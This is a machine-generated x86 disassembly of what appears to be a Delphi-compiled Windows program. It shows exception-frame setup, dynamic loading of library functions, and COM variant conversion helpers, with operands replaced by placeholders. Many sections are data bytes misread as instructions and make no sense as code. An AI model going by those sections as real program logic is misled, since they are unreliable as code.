test ecx ecx
jg r-xdata
mov eax ebx
call sub_40d1c0
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40d1c0
sub_40d3bc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40d3e0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40d457
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_405634
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_40324c
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d45e
lea eax [ ebp - 0x4 ]
call sub_405634
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_40324c
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40d3bc
test al al
jne r-xdata
mov al 0x1
sub_40d478
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40d4ea
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40d4cc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4043a8
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d4d3
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40d526
inc edi
add al ah
mov dl 0x47
add [ eax - 0x27ffb840 ] ch
mov dl 0x47
add [ eax - 0x3f ] ch
inc edi
add al dl
mov dl 0x47
add [ eax - 0x37ffb841 ] dl
mov dl 0x47
add al cl
rol [ edi ] 0xc0
mov dl 0x47
add [ edx + eax * 8 ] ah
inc edi
add [ eax + 0x380047b2 ] bh
rol [ edi ] 0xb0
mov dl 0x47
add [ eax - 0x3f ] al
inc edi
add [ eax - 0x63ffb84e ] ch
retn
sub_40d596
inc edi
add [ eax - 0x4e ] dh
inc edi
add [ ecx + eax * 8 + 0x47 ] dl
add [ eax - 0x4e ] ch
inc edi
add [ ebx + eax * 8 - 0x4d9fffb9 ] ah
inc edi
add [ eax + 0x580047c3 ] dh
mov dl 0x47
add [ eax + eax * 8 - 0x4dafffb9 ] dl
inc edi
add [ eax - 0x40 ] dl
inc edi
add [ eax - 0x4e ] cl
inc edi
add [ eax ] bh
retn 0x47
sub_40d5d0
cmp [ edx - 0x4063ffb9 ] dh
inc edi
add [ eax ] dh
mov dl 0x47
add [ eax + 0x280047c3 ] bl
mov dl 0x47
add [ eax - 0x3f ] dl
inc edi
add [ eax ] ch
add [ eax ] al
add [ eax ] ah
mov dl 0x47
add [ eax - 0x3d ] bh
inc edi
add [ eax ] al
add [ eax ] al
add [ edx + esi * 4 ] bl
inc edi
add ah ch
mov edi 0x47
add [ eax ] al
sbb [ edx - 0x3d3fffb9 ] dh
inc edi
add [ eax ] al
add [ eax ] al
add [ edx + esi * 4 ] dl
inc edi
add [ eax + 0x47bf ] ch
add [ eax ] al
add [ eax ] dl
mov dl 0x47
add [ eax - 0x40 ] ch
inc edi
add [ eax ] al
add [ eax ] al
add [ edx + esi * 4 ] cl
inc edi
add [ eax - 0x40 ] ah
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] cl
mov dl 0x47
add [ eax + eax * 8 ] al
inc edi
add [ eax ] al
add [ eax ] al
add [ edx + esi * 4 ] al
inc edi
add [ ecx + eax * 8 + 0x47 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov dl 0x47
add [ edx + eax * 8 + 0x47 ] bl
add [ eax ] al
add [ eax ] al
add ah bh
mov cl 0x47
add [ eax + eax * 8 + 0x47 ] ah
add [ eax ] al
add [ eax ] al
add al bh
mov cl 0x47
add [ eax ] dh
retn 0x47
sub_40d94c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40d9b4
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d9bb
retn
mov eax sub_40d4fc
call sub_403c94
mov eax r-xdata
call sub_403cbc
cmp [ rw-data ] 0x0
je r-xdata
call sub_40c084
call sub_40c188
call sub_40cf38
call sub_40cad0
mov eax rw-data
mov edx r-xdata
call sub_403f3c
sub_40d9ec
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
mov ax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_40da40
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40da9a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404170
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4080c8
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40daa1
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_40daac
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40db06
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404170
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4098c0
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40db0d
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_40db18
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40db72
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404170
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409894
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40db79
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_40db84
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dbde
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404170
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40b134
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dbe5
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_40dbf0
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dc4a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404170
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4098ec
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dc51
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_40dc5c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_40dcc9
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404170
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_4081b4
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dcd0
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
sub_40dcdc
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40dd3c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_4097f0
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_404714
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dd43
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_40dd4c
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40ddac
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40a8f4
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_404714
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ddb3
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_40ddbc
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40de20
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_408250
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_404714
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40de27
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_40de50
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_40de7c
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_40d9ec
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da1c
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da1c
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da28
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da28
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da28
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da28
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da28
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da28
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da28
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da28
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da28
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da34
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da40
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40daac
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db18
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db84
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbf0
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dc5c
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dcdc
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dd4c
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40ddbc
mov eax r-xdata
call sub_40de50
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_40e188
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40e1ad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e1b4
retn
sub_40e1ea
leave
loope r-xdata
add [ eax ] al
add [ eax ] al
add dh dl
loope r-xdata
add [ eax ] al
add [ eax ] al
add al ah
loope r-xdata
add [ eax ] al
add [ eax + 0xc0040e2 ] ah
add [ eax ] al
add [ eax - 0x1fffbff0 ] dh
xor eax [ eax ]
in al dx
xor eax [ eax ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
0x80040e1 0x0
sub_40e211
add [ eax ] al
add [ eax ] al
add [ ebx + 0x40e264c0 ] cl
add dh dh
loope r-xdata
add [ eax + ecx ] dl
inc ecx
add [ eax ] bl
or [ ecx ] eax
movsb [ edi ] [ esi ]
or [ ecx ] al
fmul [ eax ]
inc ecx
add [ eax - 0xbffbef8 ] bh
or [ ecx ] al
mov al [ 0x14004108 ]
pop es
inc ecx
add [ edi + eax + 0x41 ] cl
add al bl
pop es
inc ecx
add al al
sub [ eax ] eax
shr [ ecx ] 0x40
add [ eax ] cl
pop es
inc ecx
add ah ch
or [ ecx ] al
mov al [ 0xffffffff94004107 ]
pop es
inc ecx
add [ edx ] dl
push esp
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040e2 ] ah
add [ eax ] al
add [ eax - 0x1fffbff0 ] dh
xor eax [ eax ]
in al dx
xor eax [ eax ]
je r-xdata
inc eax
add al dh
insd
push esi
popad
jb r-xdata
xor eax [ eax ]
popad
outsb
je r-xdata
xor bl ah
inc eax
jns r-xdata
inc eax
add [ eax ] dh
nop
mov eax 0x70040e2
adc dl [ ebx + eax * 2 + 0x75 ]
jae r-xdata
jo r-xdata
popad
outsb
je r-xdata
popad
jb r-xdata
outsd
insd
push esi
popad
jb r-xdata
insb
outsd
ja r-xdata
inc ebx
add al ch
xor eax [ eax ]
xor [ ecx ] dh
inc eax
outsb
inc eax
add [ esi ] dl
inc ebp
push esi
popad
outsb
je r-xdata
add [ eax ] dh
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x40 ] bl
inc ebp
jb r-xdata
jb r-xdata
popad
outsb
je r-xdata
jns r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x6f727245
xor [ eax ] eax
dec esp
xor [ eax ] eax
mov [ ecx ] dh
xor eax [ eax ]
call 0x30412358
jns r-xdata
push esi
popad
jb r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl ah 0x40
outsd
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
cmp al 0x77
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
in al 0x40
outsd
jb r-xdata
inc ecx
jb r-xdata
inc eax
add [ eax + 0x15004031 ] cl
inc ebp
push esi
popad
jb r-xdata
pop esp
in al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
jae r-xdata
inc ebx
popad
jb r-xdata
xchg esp eax
jecxz r-xdata
jbe r-xdata
loop r-xdata
adc eax 0x72615645
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
jns r-xdata
add al ch
xor eax [ eax ]
xor [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] cl
add [ eax + 0x17004031 ] cl
inc ebp
push esi
popad
jb r-xdata
outsb
rcr [ esp + 0x40 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
sar al 0xe3
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
inc ebp
jb r-xdata
jbe r-xdata
popad
outsb
je r-xdata
jb r-xdata
popad
outsb
je r-xdata
add [ ecx + esi + 0x40 ] cl
add [ eax + 0x15004031 ] cl
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0xc0040 ] dl
add al ah
xor eax [ eax ]
in al dx
add [ ecx + edx ] al
inc eax
add [ eax ] al
add [ eax ] cl
push esi
add [ eax ] dh
xor [ eax ] eax
dec esp
xor [ eax ] eax
mov [ ecx ] dh
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
outsb
js r-xdata
dec ecx
popad
outsb
je r-xdata
popad
insb
imul esp [ ecx + eax * 2 + 0x72 ] 0x72724567
add [ eax + eax ] cl
add [ eax ] al
cmp al 0x77
inc eax
add al ah
xor eax [ eax ]
in al dx
xor eax [ eax ]
add [ eax ] al
add [ edi + esi * 2 ] bh
inc eax
add al ah
xor eax [ eax ]
in al dx
xor eax [ eax ]
in eax 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0xc0040 ] ah
add [ eax ] al
cmp al 0x77
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0xe5
inc eax
add [ eax + eax ] cl
outsd
jb r-xdata
xor [ eax ] eax
dec esp
xor [ eax ] eax
mov [ ecx ] dh
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
jecxz r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
jecxz r-xdata
add [ eax ] al
lea eax [ eax ]
xor bl ah
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
jecxz r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ch ah
inc eax
add [ eax + eax ] cl
add [ eax ] al
cmp al 0x77
inc eax
add al ah
xor eax [ eax ]
in al dx
xor eax [ eax ]
inc eax
add al ah
xor eax [ eax ]
in al dx
xor eax [ eax ]
add [ eax ] al
add [ edi + esi * 2 ] bh
add [ eax + eax ] cl
add [ eax ] al
cmp al 0x77
inc eax
add al ah
xor eax [ eax ]
in al dx
xor eax [ eax ]
in al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
in al 0x40
jb r-xdata
add [ eax ] al
cmp al 0x77
inc eax
add al ah
xor eax [ eax ]
in al dx
xor eax [ eax ]
add [ eax + eax ] cl
nop
add [ eax + eax ] cl
add [ eax ] al
cmp al 0x77
inc eax
add ah ch
jb r-xdata
add ah ch
jb r-xdata
ror [ eax + 0x40e5 ] 0x0
inc eax
add [ esi + 0x40 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0xc0040e6
add [ eax ] al
add [ edi + esi * 2 ] bh
popad
jb r-xdata
popad
jns r-xdata
inc eax
add ah dh
xor eax [ eax ]
call 0x30412680
xor [ eax ] eax
dec esp
xor [ eax ] eax
mov [ ecx ] dh
inc eax
add [ eax * 2 + 0x69726156 ] dl
jb r-xdata
inc eax
add al ah
xor eax [ eax ]
in al dx
xor eax [ eax ]
add [ eax ] al
jb r-xdata
add [ eax ] dh
xor [ eax ] eax
dec esp
xor [ eax ] eax
mov [ ecx ] dh
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
xor [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] cl
add [ eax + 0x18004031 ] cl
outsd
jo r-xdata
popad
je r-xdata
xor eax [ eax ]
inc eax
add [ eax - 0x1a ] bl
inc eax
add [ eax ] al
outsb
je r-xdata
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1a ] bl
inc eax
add [ eax + eax ] cl
add [ eax ] al
cmp al 0x77
inc eax
add al ah
xor eax [ eax ]
in al dx
outsd
jb r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
inc ebp
push esi
popad
jb r-xdata
inc eax
add [ eax ] dh
xor [ eax ] eax
dec esp
xor [ eax ] eax
mov [ ecx ] dh
inc eax
add [ eax ] bl
insd
jb r-xdata
inc ebp
jb r-xdata
inc ebp
jb r-xdata
xor eax [ eax ]
inc eax
add al dh
in eax 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
in eax 0x40
add [ eax + eax ] cl
add [ eax ] al
cmp al 0x77
inc eax
add al ah
xor eax [ eax ]
in al dx
add [ eax + 0x15004031 ] cl
inc ebp
push esi
popad
jb r-xdata
outsb
js r-xdata
xor eax [ eax ]
xor [ ecx ] dh
inc eax
add [ ecx + esi + 0x40 ] cl
add [ eax + 0x17004031 ] cl
inc ebp
push esi
popad
jb r-xdata
jne r-xdata
je r-xdata
inc eax
add [ edi ] ah
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] ah
inc eax
add [ eax + eax ] cl
add [ eax ] al
cmp al 0x77
inc eax
add al ah
xor eax [ eax ]
in al dx
xor eax [ eax ]
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0xc0040 ] bh
add [ eax ] al
cmp al 0x77
outsd
add esp 0xffffffe4
push ebx
popad
outsb
je r-xdata
in al dx
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
jae r-xdata
popad
mov bh ah
inc eax
dec edi
dec bp
insd
outsd
jb r-xdata
jb r-xdata
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e7f1
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
imul esi [ ebx + 0x70 ] 0x68637461
inc ebp
jb r-xdata
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
xor eax eax
add [ edi + edi * 8 + 0x30 ] ah
outsd
jb r-xdata
xor eax eax
push ebp
dec ebp
in al 0x8b
mov ebx eax
popad
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040e7 ] cl
add [ eax ] al
add [ edi + esi * 2 ] bh
inc eax
add al ah
xor eax [ eax ]
in al dx
xor eax [ eax ]
inc ebp
jb r-xdata
popad
jns r-xdata
push sub_40e883
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4104e4
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4104e4
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_403924
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e88a
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403f0c
retn
outsd
dec edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
out 0x40 eax
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
jb r-xdata
push 0x6f727245
add [ eax ] al
add [ eax ] al
outsd
push 0x0
xor eax eax
push ebp
push sub_40e7ea
push [ fs : eax ]
rcl [ ebp - 0x75 ] 0xec
sub_40e7a0
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e7ea
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e7f1
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_40e7f4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
